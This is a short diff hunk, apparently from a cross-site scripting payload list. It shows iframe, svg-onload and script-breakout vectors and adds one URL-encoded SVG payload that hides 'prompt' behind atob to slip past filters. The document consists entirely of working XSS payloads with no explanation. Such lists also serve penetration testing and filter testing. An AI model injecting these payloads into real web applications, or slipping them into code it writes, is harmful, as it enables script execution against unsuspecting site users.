@@ -2,8 +2,7 @@
 <iframe/src=javascript:alert(111)>
 <svg/test=""onload=alert(111)>
 a='\\'; alert(1); </script> <!--
-
-
+%3Csvg%2Bonload%253d%22self%5Batob(%60cHJvbXB0%60)%5D()%22%2Baa%253d'%3D
 
 
 
